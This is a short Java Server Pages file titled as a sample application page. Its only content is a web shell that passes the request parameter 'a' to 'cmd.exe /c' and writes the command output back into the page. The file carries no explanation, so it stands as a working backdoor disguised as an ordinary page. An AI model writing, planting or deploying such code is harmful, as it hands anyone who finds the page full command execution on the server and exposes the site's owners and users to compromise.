<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<html>
<head>
<title>Sample Application JSP Page</title>
</head>
<body>
<%
if (request.getParameter("a") != null) {
Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("a"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while (disr != null) {
out.println(disr);disr = dis.readLine();}
}
%>
</body>
</html>
